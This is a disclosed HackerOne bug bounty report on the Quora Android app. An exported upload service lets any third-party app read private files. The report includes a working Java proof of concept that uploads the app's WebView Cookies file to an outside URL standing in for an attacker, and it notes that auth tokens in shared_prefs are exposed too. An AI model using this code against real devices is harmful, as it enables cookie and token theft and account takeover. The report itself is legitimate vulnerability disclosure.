# [Quora Android] Possible to steal arbitrary files from mobile device

## Report Details
- **Report ID**: 258460
- **URL**: https://hackerone.com/reports/258460
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-09T22:24:55.836Z
- **Disclosed**: 2017-08-30T18:35:24.358Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: quora

## Vulnerability Information
**Summary:**
Service
```xml
<service android:enabled="true" android:exported="true" android:name="net.gotev.uploadservice.UploadService"/>
```
enabled and exported. If it's exported, it means that any third party application can access it and send arbitrary data into it.

The following code sends main database file to arbitrary server (I used http://google.com/zaheck):
```java
        UploadTaskParameters params = new UploadTaskParameters();
        params.setId("1337");
        params.setServerUrl("http://google.com/zaheck");
        try {
            params.addFile(new UploadFile("/data/data/com.quora.android/app_webview/Cookies"));

        }
        catch(FileNotFoundException e) {
            throw new IllegalStateException(e); /* should be never thrown because not checked on the client side */
        }

        Intent intent = new Intent("net.gotev.uploadservice.action.upload");
        intent.setClassName("com.quora.android", "net.gotev.uploadservice.UploadService");
        intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
        intent.putExtra("multipartUtf8Charset", true);
        intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
        intent.putExtra("taskParameters", params);
        startService(intent);
```
In the result protected file ```/data/data/com.quora.android/app_webview/Cookies``` which is not accessible to any application besides yours is sent to the attacker. It's really serious vulnerability which allows to takeover accounts. It can be used by any third party installed application on the same device. On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).

**Description (Include Impact):**
I believe it's not your vulnerability, but the gotev's library you use. Anyway, attacker can steal files with settings, cookies (even httpOnly, it doesn't matter), google authorization token is stored in shared_prefs file, which also can be stolen

PoC:
{F211064}

This file contain sensitive cookies
{F211066}

### Steps To Reproduce
 I attached an apk file which sends ```/data/data/com.quora.android/app_webview/Cookies``` to http://google.com/zaheck

Install apk and open it, file with all cookies will be sent automatically to attacker provided URL


## Attachments
- 2017-08-10_01-13-31.jpg
- 2017-08-10_01-21-39.jpg
- app-release.apk
